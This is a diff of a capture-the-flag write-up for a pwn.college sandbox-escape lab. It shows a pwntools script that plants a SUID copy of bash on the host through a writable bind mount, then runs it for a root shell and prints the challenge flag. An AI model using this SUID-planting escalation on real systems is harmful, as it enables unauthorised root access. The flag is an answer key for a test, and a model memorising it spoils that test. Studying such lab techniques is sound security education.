@@ -3795,7 +3795,7 @@ These bind mounts are independent mount table entries that point directly at the
 
 We abuse the writable bind mount to plant a SUID bash binary into the real host's `/bin`.
 
-**Step 1** — From inside the jail, copy bash and set the SUID bit on it:
+**Step 1** - From inside the jail, copy bash and set the SUID bit on it:
 
 ```python
 from pwn import *
@@ -3817,42 +3817,15 @@ p.close()
 
 Since `/bin` is bind-mounted from the real host, `/bin/bashsuid` now exists on the actual host filesystem with the SUID bit set.
 
-**Step 2** — From a terminal outside the jail, run it with `-p` to preserve SUID privileges:
+**Step 2** - From a terminal outside the jail, run it with `-p` to preserve SUID privileges:
 
-```bash
-/bin/bashsuid -p
+```
+hacker@sandboxing~mount-cleanup:~$ /bin/bashsuid -p
 ```
 
 This drops us into a root shell on the real host. Then:
 
-```bash
-cat /flag
 ```
-
-### Solver
-
-```python
-from pwn import *
-
-context.log_level = "error"
-
-p = process("/challenge/babyjail_level15")
-
-p.recvuntil(b"Good luck!")
-
-p.sendline(b"cp /bin/bash /bin/bashsuid; chmod 4755 /bin/bashsuid")
-
-p.sendline(b"echo done")
-
-p.recvuntil(b"done")
-
-p.close()
-```
-
-Then from outside:
-
-```bash
-hacker@sandboxing~mount-cleanup:~$ /bin/bashsuid -p
 bashsuid-5.0# cat /flag
 pwn.college{IH60WiwTvVZzkOYQdXpKfLset9i.dhDMzMDL4ITM0EzW}
 ```
